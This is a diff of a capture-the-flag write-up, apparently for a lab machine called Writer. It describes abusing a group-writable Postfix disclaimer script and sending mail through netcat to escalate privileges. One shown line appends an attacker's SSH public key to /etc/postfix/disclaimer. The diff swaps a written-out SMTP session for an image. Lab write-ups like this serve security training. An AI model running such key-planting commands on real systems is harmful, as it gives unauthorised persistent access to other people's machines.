@@ -149,18 +149,10 @@ I'll use find to see what files the `filter` group owns.
 
 `echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCKiry8TPPU0lHxqHU41I4c7vQHqE8OAWwW0UkXAdoMuia8PKi7jRYamltQF/C45GBS745vT4LSAhgazlK6ujQt4Hi3SIxCNkF3xzskbamWNrjqLgk1jfAczVgoNAdqLsaZSQ7Z46ewoU7F5JC+1tYKdoEyXi7tWHbvg45POXmtTyuXtty50WoDq0uklunB9tC2LQZtgoG8fewCRFZz+Q5JSKPjoGCqm+O/MejKvGxpR1JD1I6XhbbpPntFkBRHJQP/+oGw8+2+peXA7392eEP9+0SapCK5e+sAEoVh44H+4BopWl1A5Sq49PPcGZPifcR1jq+iLEYAzgMCwd7ksrn302kOTyfSKTHUkcnrca/k9f9VTQ42S5RMdLmzehfZnyeF5izM2er0IRQuyhyi+8EUturfHfTrlVjlTJjZ62PrWn8T0KokTvjN8nPoVJWZKm5OeFQL3mjA7pRXio91FGQ5OEPFBTE4ONACEgSmPKnChNak/IjsvlxFOON6AdhPLdk= kali@kali' >> /etc/postfix/disclaimer`
 
-Next I'll create a file `email.txt` in `/home/kyle` containing the commands to send an email to `www-data`. It looks like this
+Next I'll create a file in `/home/kyle` containing the commands to send an email to `www-data`, then run the script through netcat. It looks like this
 
-```
-EHLO writer.htb
-MAIL FROM:<max@writer.htb>
-RCPT TO:<www-data@writer.htb>
-DATA
-Subject: test
+<img src='Images/mail.png'>
 
-this is a test
-.
-QUIT
-```
+
 
 
